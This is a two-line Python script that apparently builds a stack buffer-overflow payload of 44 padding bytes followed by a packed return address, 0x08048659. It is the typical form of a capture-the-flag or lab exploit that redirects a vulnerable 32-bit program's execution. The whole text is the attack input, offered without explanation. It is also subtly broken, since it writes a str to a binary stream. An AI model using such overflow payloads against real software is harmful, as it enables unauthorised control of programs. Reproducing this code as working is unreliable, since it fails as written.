import sys,struct;x=lambda a:struct.pack('I', a).decode('ISO-8859-1');
sys.stdout.buffer.write('D'*44 + x(0x08048659) + 'A')
